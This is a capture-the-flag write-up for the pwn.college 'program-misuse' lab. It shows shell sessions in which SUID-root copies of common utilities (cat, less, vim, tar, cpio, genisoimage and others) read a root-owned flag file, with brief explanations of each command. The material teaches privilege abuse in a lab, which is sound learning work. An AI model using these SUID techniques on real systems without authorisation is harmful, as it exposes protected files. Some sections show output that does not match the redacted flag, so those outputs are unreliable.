
## 1. `cat`

```bash
hacker@program-misuse~cat:/challenge$ ls -l
total 0
lrwxrwxrwx 1 root root 12 Nov  1 10:21 cat -> /usr/bin/cat
hacker@program-misuse~cat:/challenge$ ls -l /usr/bin/cat
-rwsr-xr-x 1 root root 43416 Sep  5  2019 /usr/bin/cat
hacker@program-misuse~cat:/challenge$ cat ../flag
pwn.college{xxxxxxxxFLAGxxxxxxxx}
```

Reading the file permissions for `/usr/bin/cat` I found out it has **SETUID** setup for this binary at the root level so I used it to read the contents of the flag. The `->` sign means `cat` is a symbolic link and `/usr/bin/cat` is the actual path of the `cat` command.


## 2. `more`

```bash
hacker@program-misuse~more:/challenge$ ls -l
total 0
lrwxrwxrwx 1 root root 13 Nov  1 12:21 more -> /usr/bin/more
hacker@program-misuse~more:/challenge$ ls -l /usr/bin/more
-rwsr-xr-x 1 root root 43160 Apr  9  2024 /usr/bin/more
hacker@program-misuse~more:/challenge$ more ../flag
pwn.college{xxxxxxxxFLAGxxxxxxxx}
```


## 3. `less`

```bash
hacker@program-misuse~less:/challenge$ ls -l
total 0
lrwxrwxrwx 1 root root 13 Nov  1 12:26 less -> /usr/bin/less
hacker@program-misuse~less:/challenge$ ls -l /usr/bin/less
-rwsr-xr-x 1 root root 180064 Apr 28  2024 /usr/bin/less
hacker@program-misuse~less:/challenge$ less ../flag
```

The `less` command is a file pager that allows viewing the content of files one screenful at a time, providing interactive navigation.


## 4. `tail`

```bash
hacker@program-misuse~tail:~$ cd /challenge
hacker@program-misuse~tail:/challenge$ ls -l
total 0
lrwxrwxrwx 1 root root 13 Nov  1 12:36 tail -> /usr/bin/tail
hacker@program-misuse~tail:/challenge$ ls -l /usr/bin/tail
-rwsr-xr-x 1 root root 72088 Sep  5  2019 /usr/bin/tail
hacker@program-misuse~tail:/challenge$ tail ../flag
pwn.college{xxxxxxxxFLAGxxxxxxxx}
```


## 5. `head`

```bash
hacker@program-misuse~head:~$ cd /challenge
hacker@program-misuse~head:/challenge$ ls -l
total 0
lrwxrwxrwx 1 root root 13 Nov  1 12:38 head -> /usr/bin/head
hacker@program-misuse~head:/challenge$ ls -l /usr/bin/head
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/head
hacker@program-misuse~head:/challenge$ head ../flag
pwn.college{xxxxxxxxFLAGxxxxxxxx}
```


## 6. `sort`

```bash
hacker@program-misuse~sort:~$ cd /challenge
hacker@program-misuse~sort:/challenge$ ls -l
total 0
lrwxrwxrwx 1 root root 13 Nov  1 12:40 sort -> /usr/bin/sort
hacker@program-misuse~sort:/challenge$ ls -l /usr/bin/sort
-rwsr-xr-x 1 root root 117376 Sep  5  2019 /usr/bin/sort
hacker@program-misuse~sort:/challenge$ sort ../flag
pwn.college{xxxxxxxxFLAGxxxxxxxx}
```


## 7. `vim`

```bash
hacker@program-misuse~vim:~$ cd /challenge
hacker@program-misuse~vim:/challenge$ ls -l
total 0
lrwxrwxrwx 1 root root 12 Nov  1 12:46 vim -> /usr/bin/vim
hacker@program-misuse~vim:/challenge$ ls -l /usr/bin/vim
lrwxrwxrwx 1 root root 21 May  1  2025 /usr/bin/vim -> /etc/alternatives/vim
hacker@program-misuse~vim:/challenge$ vim ../flag
```

`vim` is an editor so when the command gets executed a window opens up and you can get your flag from there.


## 8. `emacs`

`emacs` is a GUI text editor. To bypass the GTK we need to use the `-nw` switch. A window will open up showing the contents of the flag file.

```bash
emacs -nw ../flag
```


## 9. `nano`

`nano` is another text editor. Again a new window will open will displaying the flag contents.

```bash
hacker@program-misuse~nano:/challenge$ ls -l nano 
lrwxrwxrwx 1 root root 13 Nov  1 13:58 nano -> /usr/bin/nano
hacker@program-misuse~nano:/challenge$ ls -l /usr/bin/nano
-rwsr-xr-x 1 root root 320136 Oct  9  2024 /usr/bin/nano
hacker@program-misuse~nano:/challenge$ nano ../flag
```


## 10. `rev`

`rev` command is used to reverse the order of the characters present in the file.

```bash
hacker@program-misuse~rev:/challenge$ ls -l
total 0
lrwxrwxrwx 1 root root 12 Nov  1 15:54 rev -> /usr/bin/rev
hacker@program-misuse~rev:/challenge$ rev ../flag
}WzU5OTczLDE1Ml0.-A46lL90ghJW0u-EQ2g6RUNlDKo{egelloc.nwp
hacker@program-misuse~rev:/challenge$ echo '}WzU5OTczLDE1Ml0.-A46lL90ghJW0u-EQ2g6RUNlDKo{egelloc.nwp' | rev
pwn.college{xxxxxxxxFLAGxxxxxxxx}
```


## 11. `od`

`od` command displays data in octal format (0-7). 

```bash
hacker@program-misuse~od:/challenge$ ls -l od
lrwxrwxrwx 1 root root 11 Nov  1 16:02 od -> /usr/bin/od
hacker@program-misuse~od:/challenge$ od ../flag
0000000 073560 027156 067543 066154 063545 075545 054470 057561
0000020 071516 034163 053464 034516 034163 044121 063521 063121
0000040 050110 063505 071144 027147 030460 030515 042105 075114
0000060 052143 032517 075125 076527 000012
0000071
hacker@program-misuse~od:/challenge$ od -c ../flag
0000000   p   w   n   .   c   o   l   l   e   g   e   {   8   Y   q   _
0000020   N   s   s   8   4   W   N   9   s   8   Q   H   Q   g   Q   f
0000040   H   P   E   g   d   r   g   .   0   1   M   1   E   D   L   z
0000060   c   T   O   5   U   z   W   }  \n
0000071
```


## 12. `hd`

`hd` command displays data in hexadecimal, octal and ascii format

```bash
hacker@program-misuse~hd:/challenge$ hd ../flag
00000000  70 77 6e 2e 63 6f 6c 6c  65 67 65 7b 38 50 61 47  |YOUR FLAG|
00000010  66 76 56 51 72 4f 62 56  54 4c 52 61 4d 66 76 5a  |WILL BE|
00000020  44 7a 6b 33 55 5a 54 2e  30 46 4e 31 45 44 4c 7a  |DISPLAYED|
00000030  63 54 4f 35 55 7a 57 7d  0a                       |HERE.|
00000039

```


## 13. `xxd`

`xxd` command used for hex encoding/decoding and produces the hex dump of the file contents.

```bash
hacker@program-misuse~xxd:/challenge$ xxd ../flag
00000000: 7077 6e2e 636f 6c6c 6567 657b 4541 736a  pwn.college{xxxx
00000010: 7664 3537 695f 6a30 4d51 4435 4930 7073  xxxx FLAG WILL BE
00000020: 487a 2d5f 4b6f 642e 3056 4e31 4544 4c7a  DISPLAYED HERE
00000030: 6354 4f35 557a 577d 0a                   xxxxxx}.
```


## 14. `base32`

It is an encoding format. The `-d` switch is used to decode the `base32` encoding format.

```bash
hacker@program-misuse~base32:/challenge$ base32 ../flag
OB3W4LTDN5WGYZLHMV5WO6BVLA3TEU2PJJ5EMRSCMFYS2VDLKE2EGRZWNN2WMRJOGBWE4MKFIRGH
UY2UJ42VK6SXPUFA====
hacker@program-misuse~base32:/challenge$ echo 'OB3W4LTDN5WGYZLHMV5WO6BVLA3TEU2PJJ5EMRSCMFYS2VDLKE2EGRZWNN2WMRJOGBWE4MKFIRGHUY2UJ42VK6SXPUFA====' > /tmp/baseForm
hacker@program-misuse~base32:/challenge$ base32 -d /tmp/baseForm 
pwn.college{xxxxxxxxFLAGxxxxxxxx}
```


## 15. `base64`

The binary data is split into 6 bit chunks from the left to right. 64 characters are there so the encoding is done as per the base64 mapping. The `=` sign is for the extra bits.

```bash
hacker@program-misuse~base64:/challenge$ base64 ../flag
cHduLmNvbGxlZ2V7RXJNUzFTMUFiUFFaTjNIaWRHQjdhdTNjV3FNLjAxTjFFREx6Y1RPNVV6V30K
hacker@program-misuse~base64:/challenge$ echo 'cHduLmNvbGxlZ2V7RXJNUzFTMUFiUFFaTjNIaWRHQjdhdTNjV3FNLjAxTjFFREx6Y1RPNVV6V30K' > /tmp/flag
hacker@program-misuse~base64:/challenge$ base64 -d /tmp/flag
pwn.college{xxxxxxxxFLAGxxxxxxxx}
```


## 16. `split`

`split` command is used to split the content of the file based upon our choice of lines. I only split in 1 line because the flag content will be of 1 line only.

```bash
hacker@program-misuse~split:/challenge$ split -l 1 ../flag
hacker@program-misuse~split:/challenge$ ls
split  xaa
hacker@program-misuse~split:/challenge$ cat xaa
pwn.college{xxxxxxxxFLAGxxxxxxxx}
```


## 17. `gzip`

`gzip` is used for compression of files. We need to decompress the files to get our flag so we will use the `-d` switch for decompression.

```bash
hacker@program-misuse~gzip:/challenge$ ls -l
total 0
lrwxrwxrwx 1 root root 13 Nov  1 18:56 gzip -> /usr/bin/gzip
hacker@program-misuse~gzip:/challenge$ ls ../
bin  boot  challenge  dev  etc  flag  home  lib  lib32  lib64  libx32  media  mnt  nix  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
hacker@program-misuse~gzip:/challenge$ rm /tmp/flag
hacker@program-misuse~gzip:/challenge$ ls /tmp/flag.gz 
/tmp/flag.gz
hacker@program-misuse~gzip:/challenge$ gzip -c ../flag > /tmp/flag.gz 
hacker@program-misuse~gzip:/challenge$ ls -l /tmp/flag.gz 
-rw-r--r-- 1 hacker hacker 82 Nov  1 19:10 /tmp/flag.gz
hacker@program-misuse~gzip:/challenge$ gzip -d /tmp/flag.gz 
hacker@program-misuse~gzip:/challenge$ ls -l /tmp/flag 
-rw-r--r-- 1 hacker hacker 57 Nov  1 19:10 /tmp/flag
hacker@program-misuse~gzip:/challenge$ cat /tmp/flag 
pwn.college{xxxxxxxxFLAGxxxxxxxx}
```


## 18. `bzip2`

Same procedure for the `bzip2` just like `gzip`.

```bash
hacker@program-misuse~bzip2:/challenge$ bzip2 -c ../flag > /tmp/flag.bz2
hacker@program-misuse~bzip2:/challenge$ bzip2 -d /tmp/flag.bz2 
hacker@program-misuse~bzip2:/challenge$ cat /tmp/flag 
pwn.college{xxxxxxxxFLAGxxxxxxxx}
```


## 19. `zip`

`zip` is just another compression program for files and programs, same as `gzip` and `bzip2`. In `zip` command the **arg1** is the `.zip` file you need to create to store the compressed data and then use `unzip` command to decompress the compressed data to get it back in its original state.

```bash
hacker@program-misuse~zip:/challenge$ zip /tmp/flag.zip ../flag
  adding: ../flag (stored 0%)
hacker@program-misuse~zip:/challenge$ file /tmp/flag.zip
/tmp/flag.zip: Zip archive data, at least v1.0 to extract, compression method=store
hacker@program-misuse~zip:/challenge$ cd /tmp/
hacker@program-misuse~zip:/tmp$ unzip flag.zip
Archive:  flag.zip
warning:  skipped "../" path component(s) in ../flag
 extracting: flag                    
hacker@program-misuse~zip:/tmp$ cat flag
pwn.college{xxxxxxxxFLAGxxxxxxxx}
```


## 20. `tar`

`tar` is another program used for archiving files. `tar -cf` is used to compress the file so we need to make our archive file in `.tar` extension and the `-xf` is for decompressing the file. The `-xOf` combined takes decompresses the file and puts in STDOUT and the shell redirects it into a different location where we will not face any permission issues.

```bash
hacker@program-misuse~tar:/$ tar -cvf flag.tar flag
flag
hacker@program-misuse~tar:/$ ls
bin  boot  challenge  dev  etc  flag  flag.tar  home  lib  lib32  lib64  libx32  media  mnt  nix  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
hacker@program-misuse~tar:/$ tar -xOf flag.tar > /tmp/flag_copy
hacker@program-misuse~tar:/$ cat /tmp/flag_copy
pwn.college{xxxxxxxxFLAGxxxxxxxx}
```


## 21. `ar`

To archive a file we need to use `-r` switch and store that data into a file with `.a` extension.  To extract the file we use `-x` switch.

```bash
hacker@program-misuse~ar:/challenge$ ar r flag.a ../flag
ar: creating flag.a
hacker@program-misuse~ar:/challenge$ ls
ar  flag.a
hacker@program-misuse~ar:/challenge$ ar x flag.a
hacker@program-misuse~ar:/challenge$ ls
ar  flag  flag.a
hacker@program-misuse~ar:/challenge$ cat flag
pwn.college{xxxxxxxxFLAGxxxxxxxx}
```


## 22. `cpio`

`-ov` is to archive the file and verbose output. `-i` is to extract the file and `--to-stdout` is to send the extracted data to standard output. We need to mention the file inside the `.cpio` file we are extracting (here **flag**) so that we can redirect the extracted contents of it to another file (here **flag_contents**).

```bash
hacker@program-misuse~cpio:/$ echo flag | cpio -ov > /tmp/flag_copy.cpio
flag
1 block
hacker@program-misuse~cpio:/$ cd /tmp
hacker@program-misuse~cpio:/tmp$ cpio -i --to-stdout flag < flag_copy.cpio > flag_contents
1 block
hacker@program-misuse~cpio:/tmp$ cat flag_contents
pwn.college{xxxxxxxxFLAGxxxxxxxx}
```


## 23. `genisoimage`

`-sort` switch tries to determine the file's **priority** and **path**. The **path** helps `genisoimage` to find the exact location of the file and the **priority** tells where the file should be placed inside the ISO image file. In trying to do this it reads the contents of the file and gives us the flag.

```bash
hacker@program-misuse~genisoimage:/$ genisoimage -sort /flag
genisoimage: Incorrect sort file format
	pwn.college{xxxxxxxxFLAGxxxxxxxx}
```


